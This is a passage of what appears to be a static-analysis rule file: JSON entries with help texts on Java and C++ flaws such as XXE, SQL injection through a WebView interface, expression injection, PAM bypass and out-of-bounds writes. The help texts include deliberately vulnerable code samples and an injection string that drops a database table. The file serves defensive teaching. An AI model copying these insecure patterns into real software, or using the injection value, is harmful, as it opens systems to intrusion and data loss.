    "help": "# Access Java object methods through JavaScript exposure\nCalling the `addJavascriptInterface` method of the `android.webkit.WebView` class allows the web pages of a WebView to access a Java object's methods via JavaScript.\n\nObjects exposed to JavaScript are available in all frames of the WebView.\n\n\n## Recommendation\nIf you need to expose Java objects to JavaScript, guarantee that no untrusted third-party content is loaded into the WebView.\n\n\n## Example\nIn the following (bad) example, a Java object is exposed to JavaScript.\n\n\n```java\nimport android.webkit.JavascriptInterface;\nimport android.database.sqlite.SQLiteOpenHelper;\n\nclass ExposedObject extends SQLiteOpenHelper {\n    @JavascriptInterface\n    public String studentEmail(String studentName) {\n        // SQL injection\n        String query = \"SELECT email FROM students WHERE studentname = '\" + studentName + \"'\";\n\n        Cursor cursor = db.rawQuery(query, null);\n        cursor.moveToFirst();\n        String email = cursor.getString(0);\n\n        return email;\n    }\n}\n\nwebview.getSettings().setJavaScriptEnabled(true);\nwebview.addJavaScriptInterface(new ExposedObject(), \"exposedObject\");\nwebview.loadData(\"\", \"text/html\", null);\n\nString name = \"Robert'; DROP TABLE students; --\";\nwebview.loadUrl(\"javascript:alert(exposedObject.studentEmail(\\\"\"+ name +\"\\\"))\");\n\n```\n\n## References\n* Android Documentation: [addJavascriptInterface](https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String))\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n"
  },
  "java/xxe": {
    "name": "Resolving XML external entity in user-controlled data",
    "description": "Parsing user-controlled XML documents and allowing expansion of external entity references may lead to disclosure of confidential data or denial of service.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "high",
    "id": "java/xxe",
    "tags": [
      "security",
      "external/cwe/cwe-611",
      "external/cwe/cwe-776",
      "external/cwe/cwe-827"
    ],
    "filename": "ea0c9636-XXE",
    "language": "java",
    "help": "# Resolving XML external entity in user-controlled data\nParsing untrusted XML files with a weakly configured XML parser may lead to an XML External Entity (XXE) attack. This type of attack uses external entity references to access arbitrary files on a system, carry out denial of service, or server side request forgery. Even when the result of parsing is not returned to the user, out-of-band data retrieval techniques may allow attackers to steal sensitive data. Denial of services can also be carried out in this situation.\n\nThere are many XML parsers for Java, and most of them are vulnerable to XXE because their default settings enable parsing of external entities. This query currently identifies vulnerable XML parsing from the following parsers: `javax.xml.parsers.DocumentBuilder`, `javax.xml.stream.XMLStreamReader`, `org.jdom.input.SAXBuilder`/`org.jdom2.input.SAXBuilder`, `javax.xml.parsers.SAXParser`,`org.dom4j.io.SAXReader`, `org.xml.sax.XMLReader`, `javax.xml.transform.sax.SAXSource`, `javax.xml.transform.TransformerFactory`, `javax.xml.transform.sax.SAXTransformerFactory`, `javax.xml.validation.SchemaFactory`, `javax.xml.bind.Unmarshaller` and `javax.xml.xpath.XPathExpression`.\n\n\n## Recommendation\nThe best way to prevent XXE attacks is to disable the parsing of any Document Type Declarations (DTDs) in untrusted data. If this is not possible you should disable the parsing of external general entities and external parameter entities. This improves security but the code will still be at risk of denial of service and server side request forgery attacks. Protection against denial of service attacks may also be implemented by setting entity expansion limits, which is done by default in recent JDK and JRE implementations. We recommend visiting OWASP's [XML Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java), finding the specific XML parser, and applying the mitigation listed there. Other mitigations might be sufficient in some cases, but manual verification will be needed, as the query will continue to flag the parser as potentially dangerous.\n\n\n## Example\nThe following example calls `parse` on a `DocumentBuilder` that is not safely configured on untrusted data, and is therefore inherently unsafe.\n\n\n```java\npublic void parse(Socket sock) throws Exception {\n  DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n  DocumentBuilder builder = factory.newDocumentBuilder();\n  builder.parse(sock.getInputStream()); //unsafe\n}\n\n```\nIn this example, the `DocumentBuilder` is created with DTD disabled, securing it against XXE attack.\n\n\n```java\npublic void disableDTDParse(Socket sock) throws Exception {\n  DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n  factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n  DocumentBuilder builder = factory.newDocumentBuilder();\n  builder.parse(sock.getInputStream()); //safe\n}\n\n```\n\n## References\n* OWASP vulnerability description: [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing).\n* OWASP guidance on parsing xml files: [XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java).\n* Paper by Timothy Morgen: [XML Schema, DTD, and Entity Attacks](https://research.nccgroup.com/2014/05/19/xml-schema-dtd-and-entity-attacks-a-compendium-of-known-techniques/)\n* Out-of-band data retrieval: Timur Yunusov &amp; Alexey Osipov, Black hat EU 2013: [XML Out-Of-Band Data Retrieval](https://www.slideshare.net/qqlan/bh-ready-v4).\n* Denial of service attack (Billion laughs): [Billion Laughs.](https://en.wikipedia.org/wiki/Billion_laughs)\n* The Java Tutorials: [Processing Limit Definitions.](https://docs.oracle.com/javase/tutorial/jaxp/limits/limits.html)\n* Common Weakness Enumeration: [CWE-611](https://cwe.mitre.org/data/definitions/611.html).\n* Common Weakness Enumeration: [CWE-776](https://cwe.mitre.org/data/definitions/776.html).\n* Common Weakness Enumeration: [CWE-827](https://cwe.mitre.org/data/definitions/827.html).\n"
  },
  "java/insecure-basic-auth": {
    "name": "Insecure basic authentication",
    "description": "Basic authentication only obfuscates username/password in Base64 encoding, which can be easily recognized and reversed. Transmitting sensitive information without using HTTPS makes the data vulnerable to packet sniffing.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "precision": "medium",
    "id": "java/insecure-basic-auth",
    "tags": [
      "security",
      "external/cwe/cwe-522",
      "external/cwe/cwe-319"
    ],
    "filename": "f1f90a80-InsecureBasicAuth",
    "language": "java",
    "help": "# Insecure basic authentication\nBasic authentication only obfuscates usernames and passwords in Base64 encoding, which can be easily recognized and reversed, thus it must not be transmitted over the cleartext HTTP channel. Transmitting sensitive information without using HTTPS makes the data vulnerable to packet sniffing.\n\n\n## Recommendation\nEither use a more secure authentication mechanism like digest authentication or federated authentication, or use the HTTPS communication protocol.\n\n\n## Example\nThe following example shows two ways of using basic authentication. In the 'BAD' case, the credentials are transmitted over HTTP. In the 'GOOD' case, the credentials are transmitted over HTTPS.\n\n\n```java\npublic class InsecureBasicAuth {\n  /**\n   * Test basic authentication with Apache HTTP request.\n   */\n  public void testApacheHttpRequest(String username, String password) {\n\n    // BAD: basic authentication over HTTP\n    String url = \"http://www.example.com/rest/getuser.do?uid=abcdx\";\n\n    // GOOD: basic authentication over HTTPS\n    url = \"https://www.example.com/rest/getuser.do?uid=abcdx\";\n\n    HttpPost post = new HttpPost(url);\n    post.setHeader(\"Accept\", \"application/json\");\n    post.setHeader(\"Content-type\", \"application/json\");\n\n    String authString = username + \":\" + password;\n    byte[] authEncBytes = Base64.getEncoder().encode(authString.getBytes());\n    String authStringEnc = new String(authEncBytes);\n\n    post.addHeader(\"Authorization\", \"Basic \" + authStringEnc);\n  }\n\n  /**\n   * Test basic authentication with Java HTTP URL connection.\n   */\n  public void testHttpUrlConnection(String username, String password) {\n\n    // BAD: basic authentication over HTTP\n    String urlStr = \"http://www.example.com/rest/getuser.do?uid=abcdx\";\n\n    // GOOD: basic authentication over HTTPS\n    urlStr = \"https://www.example.com/rest/getuser.do?uid=abcdx\";\n\n    String authString = username + \":\" + password;\n    String encoding = Base64.getEncoder().encodeToString(authString.getBytes(\"UTF-8\"));\n    URL url = new URL(urlStr);\n    HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n    conn.setRequestMethod(\"POST\");\n    conn.setDoOutput(true);\n    conn.setRequestProperty(\"Authorization\", \"Basic \" + encoding);\n  }\n}\n\n```\n\n## References\n* SonarSource rule: [Basic authentication should not be used](https://rules.sonarsource.com/java/tag/owasp/RSPEC-2647).\n* Acunetix: [WEB VULNERABILITIES INDEX - Basic authentication over HTTP](https://www.acunetix.com/vulnerabilities/web/basic-authentication-over-http/).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n* Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).\n"
  },
  "java/tainted-format-string": {
    "name": "Use of externally-controlled format string",
    "description": "Using external input in format strings can lead to exceptions or information leaks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "java/tainted-format-string",
    "tags": [
      "security",
      "external/cwe/cwe-134"
    ],
    "filename": "a08a7398-ExternallyControlledFormatString",
    "language": "java",
    "help": "# Use of externally-controlled format string\nThe `String.format` method and related methods, like `PrintStream.printf` and `Formatter.format`, all accept a format string that is used to format the trailing arguments to the format call by providing inline format specifiers. If the format string contains unsanitized input from an untrusted source, then that string may contain extra format specifiers that cause an exception to be thrown or information to be leaked.\n\nThe Java standard library implementation for the format methods throws an exception if either the format specifier does not match the type of the argument, or if there are too few or too many arguments. If unsanitized input is used in the format string, it may contain invalid extra format specifiers which cause an exception to be thrown.\n\nPositional format specifiers may be used to access an argument to the format call by position. Unsanitized input in the format string may use a positional format specifier to access information that was not intended to be visible. For example, when formatting a Calendar instance we may intend to print only the year, but a user-specified format string may include a specifier to access the month and day.\n\n\n## Recommendation\nIf the argument passed as a format string is meant to be a plain string rather than a format string, then pass `%s` as the format string, and pass the original argument as the sole trailing argument.\n\n\n## Example\nThe following program is meant to check a card security code for a stored credit card:\n\n\n```java\npublic class ResponseSplitting extends HttpServlet {\n  protected void doGet(HttpServletRequest request, HttpServletResponse response)\n  throws ServletException, IOException {\n    Calendar expirationDate = new GregorianCalendar(2017, GregorianCalendar.SEPTEMBER, 1);\n    // User provided value\n    String cardSecurityCode = request.getParameter(\"cardSecurityCode\");\n    \n    if (notValid(cardSecurityCode)) {\n      \n      /*\n       * BAD: user provided value is included in the format string.\n       * A malicious user could provide an extra format specifier, which causes an\n       * exception to be thrown. Or they could provide a %1$tm or %1$te format specifier to\n       * access the month or day of the expiration date.\n       */\n      System.out.format(cardSecurityCode +\n                          \" is not the right value. Hint: the card expires in %1$ty.\",\n                        expirationDate);\n      \n      // GOOD: %s is used to include the user-provided cardSecurityCode in the output\n      System.out.format(\"%s is not the right value. Hint: the card expires in %2$ty.\",\n                        cardSecurityCode,\n                        expirationDate);\n    }\n\n  }\n}\n```\nHowever, in the first format call it uses the cardSecurityCode provided by the user in a format string. If the user includes a format specifier in the cardSecurityCode field, they may be able to cause an exception to be thrown, or to be able to access extra information about the stored card expiration date.\n\nThe second format call shows the correct approach. The user-provided value is passed as an argument to the format call. This prevents any format specifiers in the user provided value from being evaluated.\n\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [IDS06-J. Exclude unsanitized user input from format strings](https://wiki.sei.cmu.edu/confluence/display/java/IDS06-J.+Exclude+unsanitized+user+input+from+format+strings).\n* The Java Tutorials: [Formatting Numeric Print Output](https://docs.oracle.com/javase/tutorial/java/data/numberformat.html).\n* Java API Specification: [Formatter](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/Formatter.html).\n* Common Weakness Enumeration: [CWE-134](https://cwe.mitre.org/data/definitions/134.html).\n"
  },
  "java/unsafe-deserialization-spring-exporter-in-xml-configuration": {
    "name": "Unsafe deserialization with Spring's remote service exporters.",
    "description": "A Spring bean, which is based on RemoteInvocationSerializingExporter, initializes an endpoint that uses ObjectInputStream to deserialize incoming data. In the worst case, that may lead to remote code execution.",
    "kind": "problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/unsafe-deserialization-spring-exporter-in-xml-configuration",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-502"
    ],
    "filename": "094f8cd6-UnsafeSpringExporterInXMLConfiguration",
    "language": "java",
    "help": "# Unsafe deserialization with Spring's remote service exporters.\nThe Spring Framework provides several classes for creating remote service exporters. Under the hood, the exporters use various deserialization mechanisms such as `ObjectInputStream` or Hessian. Deserializing untrusted data is easily exploitable and in many cases allows an attacker to execute arbitrary code. If a remote attacker can reach endpoints created by the exporters, it results in remote code execution in the worst case.\n\nExamples of unsafe exporters include: `HttpInvokerServiceExporter`, `SimpleHttpInvokerServiceExporter`, `RmiServiceExporter`, `HessianServiceExporter`.\n\nCVE-2016-1000027 has been assigned to this issue in the Spring Framework. It is regarded as a design limitation, and can be mitigated but not fixed outright.\n\n\n## Recommendation\nAvoid using unsafe service exporters. Instead, use other message formats for API endpoints (for example, JSON), but make sure that the underlying deserialization mechanism is properly configured so that deserialization attacks are not possible. If the vulnerable exporters can not be replaced, consider using global deserialization filters introduced in JEP 290.\n\n\n## Example\nThe following examples shows how a vulnerable HTTP endpoint can be defined in a Spring XML config:\n\n\n```xml\n<bean name=\"/account\" class=\"org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter\">\n    <property name=\"service\" ref=\"accountService\"/>\n    <property name=\"serviceInterface\" value=\"AccountService\"/>\n</bean>\n```\n\n## References\n* OWASP: [Deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data).\n* Spring Framework API documentation: [RemoteInvocationSerializingExporter class](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/rmi/RemoteInvocationSerializingExporter.html)\n* Spring Framework API documentation: [HttpInvokerServiceExporter class](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html)\n* National Vulnerability Database: [CVE-2016-1000027](https://nvd.nist.gov/vuln/detail/CVE-2016-1000027)\n* Tenable Research Advisory: [\\[R2\\] Pivotal Spring Framework HttpInvokerServiceExporter readRemoteInvocation Method Untrusted Java Deserialization](https://www.tenable.com/security/research/tra-2016-20)\n* Spring Framework bug tracker: [Sonatype vulnerability CVE-2016-1000027 in Spring-web project](https://github.com/spring-projects/spring-framework/issues/24434)\n* OpenJDK: [JEP 290: Filter Incoming Serialization Data](https://openjdk.java.net/jeps/290)\n* Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).\n"
  },
  "java/javaee-expression-injection": {
    "name": "Jakarta Expression Language injection",
    "description": "Evaluation of a user-controlled expression may lead to arbitrary code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/javaee-expression-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-094"
    ],
    "filename": "dad3fd69-JakartaExpressionInjection",
    "language": "java",
    "help": "# Jakarta Expression Language injection\nJakarta Expression Language (EL) is an expression language for Java applications. There is a single language specification and multiple implementations such as Glassfish, Juel, Apache Commons EL, etc. The language allows invocation of methods available in the JVM. If an expression is built using attacker-controlled data, and then evaluated, it may allow the attacker to run arbitrary code.\n\n\n## Recommendation\nIt is generally recommended to avoid using untrusted data in an EL expression. Before using untrusted data to build an EL expression, the data should be validated to ensure it is not evaluated as expression language. If the EL implementation offers configuring a sandbox for EL expressions, they should be run in a restrictive sandbox that allows accessing only explicitly allowed classes. If the EL implementation does not support sandboxing, consider using other expression language implementations with sandboxing capabilities such as Apache Commons JEXL or the Spring Expression Language.\n\n\n## Example\nThe following example shows how untrusted data is used to build and run an expression using the JUEL interpreter:\n\n\n```java\nString expression = \"${\" + getRemoteUserInput() + \"}\";\nExpressionFactory factory = new de.odysseus.el.ExpressionFactoryImpl();\nValueExpression e = factory.createValueExpression(context, expression, Object.class);\nSimpleContext context = getContext();\nObject result = e.getValue(context);\n```\nJUEL does not support running expressions in a sandbox. To prevent running arbitrary code, incoming data has to be checked before including it in an expression. The next example uses a Regex pattern to check whether a user tries to run an allowed expression or not:\n\n\n```java\nString input = getRemoteUserInput();\nString pattern = \"(inside|outside)\\\\.(temperature|humidity)\";\nif (!input.matches(pattern)) {\n    throw new IllegalArgumentException(\"Unexpected expression\");\n}\nString expression = \"${\" + input + \"}\";\nExpressionFactory factory = new de.odysseus.el.ExpressionFactoryImpl();\nValueExpression e = factory.createValueExpression(context, expression, Object.class);\nSimpleContext context = getContext();\nObject result = e.getValue(context);\n\n```\n\n## References\n* Eclipse Foundation: [Jakarta Expression Language](https://projects.eclipse.org/projects/ee4j.el).\n* Jakarta EE documentation: [Jakarta Expression Language API](https://javadoc.io/doc/jakarta.el/jakarta.el-api/latest/index.html)\n* OWASP: [Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection).\n* JUEL: [Home page](http://juel.sourceforge.net)\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "java/sensitive-android-file-leak": {
    "name": "Leaking sensitive Android file",
    "description": "Using a path specified in an Android Intent without validation could leak arbitrary Android configuration file and sensitive user data.",
    "kind": "path-problem",
    "id": "java/sensitive-android-file-leak",
    "problem.severity": "warning",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-200"
    ],
    "filename": "6294e7f1-SensitiveAndroidFileLeak",
    "language": "java",
    "help": "# Leaking sensitive Android file\nThe Android API allows to start an activity in another mobile application and receive a result back. When starting an activity to retrieve a file from another application, missing input validation can lead to leaking of sensitive configuration file or user data because the intent could refer to paths which are accessible to the receiver application, but are intended to be application-private.\n\n\n## Recommendation\nWhen loading file data from an activity of another application, validate that the file path is not the receiver's protected directory, which is a subdirectory of the Android application directory `/data/data/`.\n\n\n## Example\nThe following examples show a bad situation and a good situation respectively. In the bad situation, a file is loaded without path validation. In the good situation, a file is loaded with path validation.\n\n\n```java\npublic class LoadFileFromAppActivity extends Activity {\n    public static final int REQUEST_CODE__SELECT_CONTENT_FROM_APPS = 99;\n\n    @Override\n    protected void onActivityResult(int requestCode, int resultCode, Intent data) {\n        if (requestCode == LoadFileFromAppActivity.REQUEST_CODE__SELECT_CONTENT_FROM_APPS &&\n                resultCode == RESULT_OK) {\n            \n            {\n                // BAD: Load file without validation\n                loadOfContentFromApps(data, resultCode);\n            }\n\n            {\n                // GOOD: load file with validation\n                if (!data.getData().getPath().startsWith(\"/data/data\")) {\n                    loadOfContentFromApps(data, resultCode);\n                }    \n            }\n        }\n    }\n\n    private void loadOfContentFromApps(Intent contentIntent, int resultCode) {\n        Uri streamsToUpload = contentIntent.getData();\n        try {\n            RandomAccessFile file = new RandomAccessFile(streamsToUpload.getPath(), \"r\");\n        } catch (Exception ex) {\n            ex.printStackTrace();\n        }\n    }\n}\n\n```\n\n## References\n* Google: [Android: Interacting with Other Apps](https://developer.android.com/training/basics/intents).\n* CVE: [CVE-2021-32695: File Sharing Flow Initiated by a Victim Leaks Sensitive Data to a Malicious App](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32695).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n"
  },
  "java/sensitive-query-with-get": {
    "name": "Sensitive GET Query",
    "description": "Use of GET request method with sensitive query strings.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/sensitive-query-with-get",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-598"
    ],
    "filename": "3b95d6f2-SensitiveGetQuery",
    "language": "java",
    "help": "# Sensitive GET Query\nSensitive information such as user passwords should not be transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing passwords into the URL therefore increases the risk that they will be captured by an attacker.\n\n\n## Recommendation\nUse HTTP POST to send sensitive information as part of the request body; for example, as form data.\n\n\n## Example\nThe following example shows two ways of sending sensitive information. In the 'BAD' case, a password is transmitted using the GET method. In the 'GOOD' case, the password is transmitted using the POST method.\n\n\n```java\npublic class SensitiveGetQuery extends HttpServlet {\n\t// BAD - Tests sending sensitive information in a GET request.\n\tpublic void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n\t\tString password = request.getParameter(\"password\");\n\t\tSystem.out.println(\"password = \" + password);\n\t}\n\t\n\t// GOOD - Tests sending sensitive information in a POST request.\n\tpublic void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n\t\tString password = request.getParameter(\"password\");\n\t\tSystem.out.println(\"password = \" + password);\n\t}\n}\n\n```\n\n## References\n* CWE: [CWE-598: Use of GET Request Method with Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)\n* PortSwigger (Burp): [Password Submitted using GET Method](https://portswigger.net/kb/issues/00400300_password-submitted-using-get-method)\n* OWASP: [Information Exposure through Query Strings in URL](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)\n* Common Weakness Enumeration: [CWE-598](https://cwe.mitre.org/data/definitions/598.html).\n"
  },
  "java/spring-view-manipulation-implicit": {
    "name": "Spring Implicit View Manipulation",
    "description": "Untrusted input in a Spring View Controller can lead to RCE.",
    "kind": "problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/spring-view-manipulation-implicit",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-094"
    ],
    "filename": "dad3fd69-SpringImplicitViewManipulation",
    "language": "java",
    "help": "# Spring Implicit View Manipulation\nThe Spring Expression Language (SpEL) is a powerful expression language provided by Spring Framework. The language offers many features including invocation of methods available in the JVM.\n\nAn unrestricted view name manipulation vulnerability in Spring Framework could lead to attacker-controlled arbitrary SpEL expressions being evaluated using attacker-controlled data, which may in turn allow an attacker to run arbitrary code.\n\nNote: two related variants of this problem are detected by different queries, \\`java/spring-view-manipulation\\` and \\`java/spring-view-manipulation-implicit\\`. The first detects taint flow problems where the return types is always `String`. While the latter, \\`java/spring-view-manipulation-implicit\\` detects cases where the request mapping method has a non-string return type such as `void`.\n\n\n## Recommendation\nIn general, using user input to determine Spring view name should be avoided. If user input must be included in the expression, the controller can be annotated by a `@ResponseBody` annotation. In this case, Spring Framework does not interpret it as a view name, but just returns this string in HTTP Response. The same applies to using a `@RestController` annotation on a class, as internally it inherits `@ResponseBody`.\n\n\n## Example\nIn the following example, the `Fragment` method uses an externally controlled variable `section` to generate the view name. Hence, it is vulnerable to Spring View Manipulation attacks.\n\n\n```java\n@Controller\npublic class SptingViewManipulationController {\n\n    Logger log = LoggerFactory.getLogger(HelloController.class);\n\n    @GetMapping(\"/safe/fragment\")\n    public String Fragment(@RequestParam String section) {\n        // bad as template path is attacker controlled\n        return \"welcome :: \" + section;\n    }\n\n    @GetMapping(\"/doc/{document}\")\n    public void getDocument(@PathVariable String document) {\n        // returns void, so view name is taken from URI\n        log.info(\"Retrieving \" + document);\n    }\n}\n\n```\nThis can be easily prevented by using the `ResponseBody` annotation which marks the response is already processed preventing exploitation of Spring View Manipulation vulnerabilities. Alternatively, this can also be fixed by adding a `HttpServletResponse` parameter to the method definition as shown in the example below.\n\n\n```java\n@Controller\npublic class SptingViewManipulationController {\n\n    Logger log = LoggerFactory.getLogger(HelloController.class);\n\n    @GetMapping(\"/safe/fragment\")\n    @ResponseBody\n    public String Fragment(@RequestParam String section) {\n        // good, as `@ResponseBody` annotation tells Spring\n        // to process the return values as body, instead of view name\n        return \"welcome :: \" + section;\n    }\n\n    @GetMapping(\"/safe/doc/{document}\")\n    public void getDocument(@PathVariable String document, HttpServletResponse response) {\n        // good as `HttpServletResponse param tells Spring that the response is already\n        // processed.\n        log.info(\"Retrieving \" + document); // FP\n    }\n}\n\n```\n\n## References\n* Veracode Research : [Spring View Manipulation ](https://github.com/veracode-research/spring-view-manipulation/)\n* Spring Framework Reference Documentation: [Spring Expression Language (SpEL)](https://docs.spring.io/spring/docs/4.2.x/spring-framework-reference/html/expressions.html)\n* OWASP: [Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "cpp/pam-auth-bypass": {
    "name": "PAM Authorization bypass",
    "description": "Only using `pam_authenticate` call to authenticate users can lead to authorization vulnerabilities.",
    "kind": "problem",
    "problem.severity": "error",
    "id": "cpp/pam-auth-bypass",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-285"
    ],
    "filename": "7d3355f8-PamAuthorization",
    "language": "cpp",
    "help": "# PAM Authorization bypass\nUsing only a call to `pam_authenticate` to check the validity of a login can lead to authorization bypass vulnerabilities.\n\nA `pam_authenticate` only verifies the credentials of a user. It does not check if a user has an appropriate authorization to actually login. This means a user with a expired login or a password can still access the system.\n\n\n## Recommendation\nA call to `pam_authenticate` should be followed by a call to `pam_acct_mgmt` to check if a user is allowed to login.\n\n\n## Example\nIn the following example, the code only checks the credentials of a user. Hence, in this case, a user expired with expired creds can still login. This can be verified by creating a new user account, expiring it with ``` chage -E0 `username`  ``` and then trying to log in.\n\n\n```cpp\nbool PamAuthGood(const std::string &username_in,\n                 const std::string &password_in,\n                 std::string &authenticated_username)\n{\n\n    struct pam_handle *pamh = nullptr; /* pam session handle */\n\n    const char *username = username_in.c_str();\n    int err = pam_start(\"test\", username,\n                        0, &pamh);\n    if (err != PAM_SUCCESS)\n    {\n        return false;\n    }\n\n    err = pam_authenticate(pamh, 0); // BAD\n    if (err != PAM_SUCCESS)\n        return err;\n    return true;\n}\n\n```\nThis can be avoided by calling `pam_acct_mgmt` call to verify access as has been done in the snippet shown below.\n\n\n```cpp\nbool PamAuthGood(const std::string &username_in,\n                 const std::string &password_in,\n                 std::string &authenticated_username)\n{\n\n    struct pam_handle *pamh = nullptr; /* pam session handle */\n\n    const char *username = username_in.c_str();\n    int err = pam_start(\"test\", username,\n                        0, &pamh);\n    if (err != PAM_SUCCESS)\n    {\n        return false;\n    }\n\n    err = pam_authenticate(pamh, 0);\n    if (err != PAM_SUCCESS)\n        return err;\n\n    err = pam_acct_mgmt(pamh, 0); // GOOD\n    if (err != PAM_SUCCESS)\n        return err;\n    return true;\n}\n\n```\n\n## References\n* Man-Page: [pam_acct_mgmt](https://man7.org/linux/man-pages/man3/pam_acct_mgmt.3.html)\n* Common Weakness Enumeration: [CWE-285](https://cwe.mitre.org/data/definitions/285.html).\n"
  },
  "cpp/work-with-file-without-permissions-rights": {
    "name": "Writing to a file without setting permissions.",
    "description": "Lack of restriction on file access rights can be unsafe.",
    "kind": "problem",
    "id": "cpp/work-with-file-without-permissions-rights",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "maintainability",
      "security",
      "experimental",
      "external/cwe/cwe-200",
      "external/cwe/cwe-264"
    ],
    "filename": "3b97a841-ExposureSensitiveInformationUnauthorizedActor",
    "language": "cpp",
    "help": "# Writing to a file without setting permissions.\nWhen creating a file using a library function such as `fopen`, the access rights for the newly created file are not specified as part of the call. Instead these rights are determined by the system unless the programmer takes specific measures, such as calling the Posix `umask` function at some point before the call to `fopen`. For some applications, the default access rights assigned by the system are not sufficient to protect a file against access by an attacker.\n\n\n## Example\nThe following example demonstrates erroneous and fixed methods for working with files.\n\n\n```cpp\n...\n  FILE *fp = fopen(filename,\"w\"); // BAD\n...\n  umask(S_IXUSR|S_IRWXG|S_IRWXO);\n  FILE *fp;\n  fp = fopen(filename,\"w\"); // GOOD\n  chmod(filename,S_IRUSR|S_IWUSR);\n  fprintf(fp,\"%s\\n\",\"data to file\");\n  fclose(fp);\n...\n\n```\n\n## References\n* CERT C Coding Standard: [FIO06-C. Create files with appropriate access permissions](https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n* Common Weakness Enumeration: [CWE-264](https://cwe.mitre.org/data/definitions/264.html).\n"
  },
  "cpp/invalid-pointer-deref": {
    "name": "Invalid pointer dereference",
    "description": "Dereferencing an out-of-bounds pointer is undefined behavior and may lead to security vulnerabilities.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "medium",
    "id": "cpp/invalid-pointer-deref",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-119",
      "external/cwe/cwe-125",
      "external/cwe/cwe-193",
      "external/cwe/cwe-787"
    ],
    "filename": "ce2eea51-InvalidPointerDeref",
    "language": "cpp",
    "help": "# Invalid pointer dereference\nThe program performs an out-of-bounds read or write operation, which can cause program instability. In addition, attackers may take advantage of the situation, and implement techniques to use this vulnerability to execute arbitrary code.\n\n\n## Recommendation\nEnsure that pointer dereferences are properly guarded to ensure that they cannot be used to read or write past the end of the allocation.\n\n\n## Example\nThe first example allocates a buffer of size `size` and creates a local variable that stores the location that is one byte past the end of the allocation. This local variable is then dereferenced, which results in an out-of-bounds write. The second example subtracts one from the `end` variable before dereferencing it. This subtraction ensures that the write correctly updates the final byte of the allocation.\n\n\n```cpp\nvoid *malloc(unsigned);\nunsigned get_size();\nvoid write_data(const unsigned char*, const unsigned char*);\n\nint main(int argc, char* argv[]) {\n  unsigned size = get_size();\n  \n  {\n    unsigned char *begin = (unsigned char*)malloc(size);\n    if(!begin) return -1;\n\n    unsigned char* end = begin + size;\n    write_data(begin, end);\n    *end = '\\0'; // BAD: Out-of-bounds write\n  }\n\n  {\n    unsigned char *begin = (unsigned char*)malloc(size);\n    if(!begin) return -1;\n\n    unsigned char* end = begin + size;\n    write_data(begin, end);\n    *(end - 1) = '\\0'; // GOOD: writing to the last byte\n  }\n\n}\n```\n\n## References\n* CERT C Coding Standard: [ARR30-C. Do not form or use out-of-bounds pointers or array subscripts](https://wiki.sei.cmu.edu/confluence/display/c/ARR30-C.+Do+not+form+or+use+out-of-bounds+pointers+or+array+subscripts).\n* OWASP: [Buffer Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow).\n* Common Weakness Enumeration: [CWE-119](https://cwe.mitre.org/data/definitions/119.html).\n* Common Weakness Enumeration: 